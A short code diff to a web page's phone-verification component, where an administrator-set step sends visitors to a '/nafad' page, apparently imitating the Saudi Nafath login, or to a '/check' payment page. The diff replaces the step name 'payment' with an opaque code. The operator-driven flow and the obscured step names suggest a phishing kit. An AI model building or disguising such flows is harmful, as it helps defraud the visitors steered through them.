@@ -55,7 +55,7 @@ export default function VerifyPhonePage() {
           } else if (data.currentStep === "_t6") {
             console.log("[phone-info] Admin redirecting to nafad")
             window.location.href = "/nafad"
-          } else if (data.currentStep === "payment") {
+          } else if (data.currentStep === "_st1") {
             console.log("[phone-info] Admin redirecting to payment")
             window.location.href = "/check"
           } else if (data.currentStep === "_t2") {
